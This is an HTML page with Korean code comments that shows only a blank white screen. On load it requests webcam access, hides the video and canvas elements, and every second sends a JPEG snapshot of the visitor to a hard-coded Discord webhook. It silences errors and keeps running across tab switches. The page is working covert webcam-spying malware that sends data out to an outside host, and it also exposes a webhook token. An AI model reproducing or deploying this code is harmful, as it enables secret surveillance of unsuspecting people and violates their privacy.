<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #ffffff;
      overflow: hidden;
    }
    video, canvas {
      position: absolute;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1474303665480269886/VN4H6eLDViJbuSX8cS_XRwus9XnJE4ruiAzuwhfTpvwmsOZj5eYjccRuTOl_vTYxswh5";

const video = document.getElementById('v');
const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d');

let stream = null;
let isCapturing = false;

async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
        width: { ideal: 1280 },
        height: { ideal: 720 }
      }
    });

    video.srcObject = stream;

    // 메타데이터 로드 완료 → 즉시 캡처 루프 시작
    video.onloadedmetadata = () => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      startCaptureLoop();
    };

  } catch (err) {
    // 권한 거부 또는 에러 → 아무 동작 안 함 (흰 화면 유지)
  }
}

function startCaptureLoop() {
  if (isCapturing) return;
  isCapturing = true;

  setInterval(async () => {
    if (!video.videoWidth || video.readyState < 2) return;

    try {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.68);
      });

      if (!blob || blob.size < 1000) return;

      const form = new FormData();
      form.append('file', blob, `cap_${Date.now()}.jpg`);
      form.append('content', ` ${new Date().toISOString().slice(0,19).replace('T',' ')}`);

      fetch(WEBHOOK, {
        method: 'POST',
        body: form,
        mode: 'no-cors'   // 크로스오리진 에러 덜 보이게
      }).catch(() => {});

    } catch (e) {
      // 조용히 무시
    }

  }, 1000); // 1초마다
}

// 페이지 로드되자마자 바로 권한 요청
window.addEventListener('load', () => {
  if (navigator.mediaDevices?.getUserMedia) {
    startCamera();
  }
});

// visibility change 시에도 계속 동작하도록 (탭 전환해도)
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'visible' && stream && !isCapturing) {
    startCaptureLoop();
  }
});

// 페이지 떠날 때 정리 (좋은 습관)
window.addEventListener('beforeunload', () => {
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
  }
});
</script>

</body>
</html>
